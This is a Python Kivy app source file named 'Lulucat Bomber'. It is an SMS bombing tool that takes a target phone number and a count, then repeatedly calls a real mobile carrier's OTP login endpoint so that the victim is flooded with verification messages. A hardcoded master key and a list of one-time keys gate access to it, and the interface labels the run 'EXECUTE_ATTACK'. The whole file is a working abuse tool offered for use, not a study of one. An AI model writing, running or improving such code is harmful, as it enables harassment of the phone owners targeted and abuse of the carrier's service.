import requests
import json
import os
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.label import Label
from kivy.core.window import Window
from kivy.clock import Clock
from kivy.uix.image import Image
from kivy.uix.progressbar import ProgressBar
from kivy.lang import Builder
from kivy.factory import Factory

Builder.load_string('''
<HackerTextInput@TextInput>:
    background_normal: ''
    background_color: (0, 0.05, 0, 1)
    foreground_color: (0, 1, 0, 1)
    cursor_color: (0, 1, 0, 1)
    hint_text_color: (0, 0.3, 0, 1)
    padding: [15, 18]
    font_size: '16sp'
    canvas.after:
        Color:
            rgba: (0, 1, 0, 0.7)
        Line:
            width: 1.2
            rounded_rectangle: (self.x, self.y, self.width, self.height, 12)

<HackerButton@Button>:
    background_normal: ''
    background_color: (0, 0, 0, 0)
    font_size: '18sp'
    bold: True
    canvas.before:
        Color:
            rgba: (0.8, 0, 0, 1) if self.state == 'normal' else (0.4, 0, 0, 1)
        RoundedRectangle:
            pos: self.pos
            size: self.size
            radius: [15,]
        Color:
            rgba: (1, 1, 1, 0.1)
        Line:
            width: 1.5
            rounded_rectangle: (self.x, self.y, self.width, self.height, 15)
''')

Window.size = (360, 640)
Window.clearcolor = (0, 0.01, 0, 1)

class LuluCatBomber(App):
    def build(self):
        self.title = "Lulucat Bomber"
        self.config_file = "sys_config.json"
        
        self.master_key = "fatlulucat1123"
        self.one_time_keys = ["lulucat", "LuLu", "lulu", "shwebo", "ninja", "khant", "mim", "thuta"]

        if self.is_unlocked():
            return self.create_main_ui()
        else:
            return self.create_login_ui()

    def is_unlocked(self):
        if os.path.exists(self.config_file):
            with open(self.config_file, 'r') as f:
                data = json.load(f)
                return data.get("status") == "verified"
        return False

    def create_login_ui(self):
        layout = BoxLayout(orientation='vertical', padding=50, spacing=30)
        layout.add_widget(Label(text="[b][color=00ff00]SYSTEM SECURITY[/color][/b]", markup=True, font_size='28sp'))
        
        self.pass_input = Factory.HackerTextInput(hint_text="ACCESS_KEY", password=True, size_hint_y=None, height=85)
        layout.add_widget(self.pass_input)
        
        btn = Factory.HackerButton(text="BYPASS LOCK", size_hint_y=None, height=95)
        btn.bind(on_press=self.verify_process)
        layout.add_widget(btn)
        return layout

    def verify_process(self, instance):
        input_key = self.pass_input.text
        if input_key == self.master_key:
            self.save_status("master")
            self.restart_app()
        elif input_key in self.one_time_keys:
            self.save_status("limited")
            self.restart_app()
        else:
            self.pass_input.text = ""
            self.pass_input.hint_text = "ACCESS_DENIED"

    def save_status(self, k_type):
        with open(self.config_file, 'w') as f:
            json.dump({"status": "verified", "type": k_type}, f)

    def restart_app(self):
        self.stop()
        LuluCatBomber().run()

    def create_main_ui(self):
        layout = BoxLayout(orientation='vertical', padding=25, spacing=15)
        # ခေါင်းစဉ်ကို Lulucat Bomber လို့ ပြောင်းလဲထားပါတယ်။
        layout.add_widget(Label(text="[b][color=00ff00]Lulucat Bomber[/color][/b]", markup=True, font_size='30sp'))
        
        layout.add_widget(Image(source='lulu_cat.jpg', size_hint_y=None, height=220))
        
        self.phone_input = Factory.HackerTextInput(hint_text="TARGET_NUM", size_hint_y=None, height=80)
        layout.add_widget(self.phone_input)
        
        self.count_input = Factory.HackerTextInput(hint_text="LIMIT_SET", size_hint_y=None, height=80, input_filter='int')
        layout.add_widget(self.count_input)

        self.status_label = Label(text="STATUS: READY", color=(0, 1, 0, 1), font_size='16sp')
        layout.add_widget(self.status_label)
        
        self.progress_bar = ProgressBar(max=100, value=0, size_hint_y=None, height=10)
        layout.add_widget(self.progress_bar)

        self.attack_btn = Factory.HackerButton(text="EXECUTE_ATTACK", size_hint_y=None, height=100)
        self.attack_btn.bind(on_press=self.start_attack)
        layout.add_widget(self.attack_btn)
        
        return layout

    def start_attack(self, instance):
        self.target = self.phone_input.text
        try:
            self.total = int(self.count_input.text or 0)
        except:
            self.total = 0
            
        if not self.target or self.total == 0: return
        self.sent = 0
        self.attack_btn.disabled = True
        self.progress_bar.max = self.total
        Clock.schedule_interval(self.bombing_logic, 1.2)

    def bombing_logic(self, dt):
        if self.sent >= self.total:
            self.status_label.text = "MISSION_ACCOMPLISHED"
            self.attack_btn.disabled = False
            return False
            
        url = f"https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={self.target}"
        try:
            requests.get(url, timeout=5)
            self.sent += 1
            self.progress_bar.value = self.sent
            self.status_label.text = f"ATTACKING: {self.sent}/{self.total}"
        except:
            pass
        return True

if __name__ == "__main__":
    LuluCatBomber().run()
